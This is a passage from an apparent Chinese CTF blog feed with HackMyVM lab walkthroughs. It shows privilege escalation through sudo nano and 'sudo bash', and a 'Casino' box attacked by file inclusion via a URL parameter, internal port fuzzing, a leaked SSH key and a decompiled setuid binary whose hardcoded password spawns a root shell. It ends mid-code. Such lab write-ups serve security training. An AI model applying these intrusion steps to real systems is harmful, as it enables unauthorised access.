          <span class="token operator">!</span>Y:^. ?.    ~Y <span class="token operator">&amp;</span>  <span class="token number">7</span> PJ<span class="token operator">!</span>P7^@@<span class="token operator">&amp;</span>Y<span class="token operator">!</span>^^.  .J<span class="token operator">&amp;</span>Y                
           P<span class="token operator">!</span>         ~P @. <span class="token builtin class-name">:</span> Y<span class="token operator">&amp;</span>  5GPJ<span class="token comment">#??~~?#G!!!7.               </span>
           <span class="token operator">!</span>?       ^?J<span class="token operator">&amp;</span><span class="token builtin class-name">.</span><span class="token comment">#J   B##: .  B7:.   5^                   </span>
            <span class="token operator">!</span><span class="token operator">!</span>^.:<span class="token operator">!</span>PP^  <span class="token operator">!</span>G<span class="token operator">!</span><span class="token operator">&amp;</span><span class="token builtin class-name">.</span>  <span class="token number">5</span>^7?J   ?<span class="token comment">#:~~^.:B^                  </span>
              .::<span class="token punctuation">..</span><span class="token operator">!</span>?   .<span class="token operator">!</span>JG. <span class="token operator">&amp;</span>^  BG~.:@       <span class="token builtin class-name">.</span>                  
                    JG<span class="token operator">!</span><span class="token operator">!</span>^<span class="token punctuation">..</span>5YYG5^ <span class="token operator">&amp;</span><span class="token punctuation">..</span>~Y<span class="token operator">&amp;</span>                          
                   .G<span class="token punctuation">..</span>.^?~  <span class="token builtin class-name">.</span>  JB<span class="token operator">!</span>    <span class="token builtin class-name">.</span>                          
                   .G<span class="token operator">!</span><span class="token number">7</span><span class="token operator">!</span>:                                   
                   
pocahontas@192.168.56.159's password: 
Welcome to Ubuntu <span class="token number">20.04</span> LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.4</span>.0-128-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue <span class="token number">23</span> Apr <span class="token number">2024</span> <span class="token number">10</span>:39:54 AM UTC

  System load:  <span class="token number">0.0</span>                Processes:               <span class="token number">128</span>
  Usage of /:   <span class="token number">20.3</span>% of <span class="token number">39</span>.07GB   Users logged in:         <span class="token number">1</span>
  Memory usage: <span class="token number">14</span>%                IPv4 address <span class="token keyword">for</span> enp0s3: <span class="token number">192.168</span>.56.159
  Swap usage:   <span class="token number">0</span>%


<span class="token number">143</span> updates can be installed immediately.
<span class="token number">2</span> of these updates are security updates.
To see these additional updates run: <span class="token function">apt</span> list <span class="token parameter variable">--upgradable</span>

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr <span class="token number">23</span> <span class="token number">10</span>:02:28 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
pocahontas@apaches:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>pocahontas<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>pocahontas<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>pocahontas<span class="token punctuation">)</span>
pocahontas@apaches:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> pocahontas: 
Matching Defaults entries <span class="token keyword">for</span> pocahontas on apaches:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User pocahontas may run the following commands on apaches:
    <span class="token punctuation">(</span>geronimo<span class="token punctuation">)</span> /bin/nano</code></pre>
<p>登上去发现可以sudo，并且利用的是nano<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyzDg.png" alt="OpyzDg.png" loading="lazy"><br>照着做就行<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyF8B.png" alt="OpyF8B.png" loading="lazy"><br>拿到了geronimo的权限，也是最后一个user</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>习惯的sudo发现好玩的东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">geronimo@apaches:/home/pocahontas$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> geronimo on apaches:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User geronimo may run the following commands on apaches:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL</code></pre>
<p>(ALL : ALL) ALL<br>(ALL) NOPASSWD: ALL<br>!!!<br>直接sudo bash拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">geronimo@apaches:/home/pocahontas$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>             M-F New Buffer                                         ^X Read File
Matching Defaults entries <span class="token keyword">for</span> geronimo on apaches:     M-<span class="token punctuation">\</span> Pipe Text
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User geronimo may run the following commands on apaches:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL
geronimo@apaches:/home/pocahontas$ <span class="token function">sudo</span> <span class="token function">bash</span>
root@apaches:/home/pocahontas<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root权限，芜湖，是不是很轻松。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>nano</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Casino</title>
    <url>/posts/16d10af0/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.169</strong></p>
<blockquote>
<p>五一放假，家里一堆事，也是一个靶机没打，放假前下的好几个靶机也是甩屁股后面了，今天开学第一天，打个靶机康复一下。边打边记录。</p>
</blockquote>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.169 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-06 <span class="token number">20</span>:56 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.169
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00086s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 3b:20:d0:ba:e2:7a:8a:01:8a:35:3b:52:08:b0:c6:a8 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">74</span>:76:0a:61:d4:2c:9b:45:36:00:4d:c8:d8:be:0b:89 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-title: Binary Bet Casino
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
MAC Address: 08:00:27:E3:4E:FC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.86</span> ms <span class="token number">192.168</span>.56.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">10.73</span> seconds</code></pre>
<p>开启了22 80两个端口 80端apache服务，直接去web看吧。</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/05/06/OpIsDU.png" alt="OpIsDU.png" loading="lazy"><br>是一个简单的登录界面，界面没有太多功能点，一个登录一个注册。<br>先去注册一手，当然注册的时候要用抓包看<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIV6Y.png" alt="OpIV6Y.png" loading="lazy"><br>没什么有用的信息，但是看这个界面我又想到admin这个账号，用admin注册发现用户已存在，那就先尝试爆破一下admin的密码<br><img src="https://ooo.0x0.ooo/2024/05/06/OpI9Yc.png" alt="OpI9Yc.png" loading="lazy"><br>爆了一下没什么结果，大概率没有弱口令，sql注入也试了一下没有什么结果，这里就不贴图了，直接登录。<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIlpq.png" alt="OpIlpq.png" loading="lazy"><br>登录上去好像是一些小游戏</p>
<blockquote>
<hr>
<p>WIN 10.000$ &#x3D;&gt; WIN A TEDDY BEAR</p>
<hr>
<p>Intructions</p>
<ul>
<li>CUPS<br>The player tries to guess which of three cups hides a small ball. The cups are shuffled, and the player must select the correct one to win. The player wins or losess the same amount he bets.</li>
<li>GUN<br>The player presses the “Shoot” button. There is a 1&#x2F;6 chance of losing. In that case, the player’s money is multiplied by 0.15. Otherwise, the player’s money is multiplied by 1.5.</li>
<li>Dice<br>The player places a bet on whether the value of the sum of two dice will be less than, equal to or greater than 7.<br>||&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;||<br>||&#x2F;&#x2F;$\&#x2F;/////////////////////////////&#x2F;$\||<br>||(100)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;| FEDERAL RESERVE NOTE |&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(100)||<br>||\$&#x2F;&#x2F;        ~         ‘——&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;——–’                \$&#x2F;&#x2F;||<br>||&lt;&lt; &#x2F;        &#x2F;$\              &#x2F;&#x2F; ____ \                         \ &gt;&gt;||<br>||&gt;&gt;|  12    &#x2F;&#x2F;L\            &#x2F;&#x2F; &#x2F;&#x2F;&#x2F;..) \         L38036133B   12 |&lt;&lt;||<br>||&lt;&lt;|        \ &#x2F;&#x2F;           || &lt;||  &gt;\  ||                        |&gt;&gt;||<br>||&gt;&gt;|         $&#x2F;            ||  $$ –&#x2F;  ||        One Hundred     |&lt;&lt;||<br>||&lt;&lt;|      L38036133B        *\  |_&#x2F;  &#x2F;&#x2F;* series                 |&gt;&gt;||<br>||&gt;&gt;|  12                     <em>\&#x2F;____&#x2F;&#x2F;</em>   1989                  |&lt;&lt;||<br>||&lt;&lt;\      Treasurer     ______&#x2F;Franklin________     Secretary 12 &#x2F;&gt;&gt;||<br>||&#x2F;&#x2F;$\                 <del>|UNITED STATES OF AMERICA|</del>               &#x2F;$\||<br>||(100)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  ONE HUNDRED DOLLARS &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(100)||<br>||\$&#x2F;&#x2F;/////////////////////////////\$&#x2F;&#x2F;||<br>||&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;||</li>
</ul>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/05/06/OpI8SG.png" alt="OpI8SG.png" loading="lazy"><br>就玩小游戏呗，也不知道要多少钱才有东西<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIXw1.png" alt="OpIXw1.png" loading="lazy"><br>玩杯子梭哈赚到10000以上也没给东西<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIInI.png" alt="OpIInI.png" loading="lazy"><br>在一次梭哈失败中，给了一个特殊的url<br><code>http://192.168.56.169/casino/explainmepls.php?learnabout=en.wikipedia.org/wiki/Shell_game</code><br>尝试LFI<br><img src="https://ooo.0x0.ooo/2024/05/06/OpI3DD.png" alt="OpI3DD.png" loading="lazy"><br>成功包含，但是除了这个界面其他文件都包含失败，在我一番苦思冥想之后， 突发奇想，想尝试一下fuzz一下内部开启的端口<br><img src="https://ooo.0x0.ooo/2024/05/06/OpIC8F.png" alt="OpIC8F.png" loading="lazy"><br>除了80外之后还有一个6969端口<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3Mk6.png" alt="Op3Mk6.png" loading="lazy"><br>给了一个todo清单不过也没什么用，尝试从6969端口进行目录扫描<br>懒得有ffuf了，直接用bp爆吧<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3W1K.png" alt="Op3W1K.png" loading="lazy"><br>爆出一个目录<code>codebreakers</code><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3bHa.png" alt="Op3bHa.png" loading="lazy"><br>源码泄露了一个地址<code>shimmer_rsa</code><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3k8S.png" alt="Op3k8S.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/06/Op3zxN.png" alt="Op3zxN.png" loading="lazy"><br>也是拿到了私钥</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>用shimmer用户登录ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh -i a.txt shimmer@192.168.56.169</span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.169 (192.168.56.169)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:3hguhY7J5te4KPihLZxYjfxLj8pyQOa7qtu0XjMl3DY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.169' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.
Debian GNU/Linux <span class="token number">12</span>
Welcome to Binary Bet Casino
--------------------------------
Linux casino <span class="token number">6.1</span>.0-9-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun <span class="token number">14</span> <span class="token number">17</span>:24:28 <span class="token number">2023</span> from <span class="token number">192.168</span>.1.71
shimmer@casino:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">48</span>
drwx------ <span class="token number">3</span> shimmer shimmer  <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> root    root     <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> shimmer shimmer     <span class="token number">9</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> shimmer shimmer   <span class="token number">220</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> shimmer shimmer  <span class="token number">3526</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .bashrc
-rwsr-xr-x <span class="token number">1</span> root    root    <span class="token number">16432</span> jun <span class="token number">14</span>  <span class="token number">2023</span> pass
-rw-r--r-- <span class="token number">1</span> shimmer shimmer   <span class="token number">807</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> shimmer shimmer  <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> .ssh
-rw-r--r-- <span class="token number">1</span> root    root       <span class="token number">17</span> jun <span class="token number">14</span>  <span class="token number">2023</span> user.txt</code></pre>
<p>shimmer目录下有user flag还有一个鲜艳的红色pass 所属root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ <span class="token function">file</span> pass
pass: setuid ELF <span class="token number">64</span>-bit LSB pie executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>69534d98e628cad52c35ba899c71650dc0e48bdf, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, not stripped</code></pre>
<p>是一个x86可执行文件<br>看看有没有泄露密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ strings pass
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
setuid
strlen
execvp
<span class="token function">open</span>
__libc_start_main
__cxa_finalize
<span class="token builtin class-name">printf</span>
getuid
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Correct pass
Incorrect pass
Passwd: 
/opt/root.pass
Second Passwd: 
ultrasecretpassword
/bin/sh
bye.
<span class="token punctuation">;</span>*3$"
GCC: <span class="token punctuation">(</span>Debian <span class="token number">12.2</span>.0-14<span class="token punctuation">)</span> <span class="token number">12.2</span>.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
pass.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
_fini
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
printf@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
open@GLIBC_2.2.5
execvp@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
checkPasswd
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment</code></pre>
<p>没泄露 可惜，不过可以看出是读取&#x2F;opt下面的root.pass</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:/opt$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">3</span> root     root     <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root     root     <span class="token number">4096</span> jun <span class="token number">13</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> root     root       <span class="token number">15</span> jun <span class="token number">14</span>  <span class="token number">2023</span> root.pass
drwxr-xr-x  <span class="token number">4</span> www-data www-data <span class="token number">4096</span> jun <span class="token number">14</span>  <span class="token number">2023</span> todo-list
-rw-r--r--  <span class="token number">1</span> root     root        <span class="token number">0</span> jun <span class="token number">14</span>  <span class="token number">2023</span> user.pass
shimmer@casino:/opt$ <span class="token function">cat</span> user.pass 
shimmer@casino:/opt$ <span class="token function">cat</span> root.pass 
cat: root.pass: Permiso denegado</code></pre>
<p>无权查看，只好丢尽ida分析了<br><img src="https://ooo.0x0.ooo/2024/05/06/Op3FpC.png" alt="Op3FpC.png" loading="lazy"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __uid_t v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-F4h]</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-F0h] BYREF</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>argva<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-80h] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-70h] BYREF</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+FCh] [rbp-4h]</span>

  <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Passwd: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">checkPasswd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/opt/root.pass"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setuid</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Second Passwd: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    s1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"ultrasecretpassword"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    argva<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"sh"</span><span class="token punctuation">;</span>
    argva<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> argva<span class="token punctuation">)</span><span class="token punctuation">;</span>
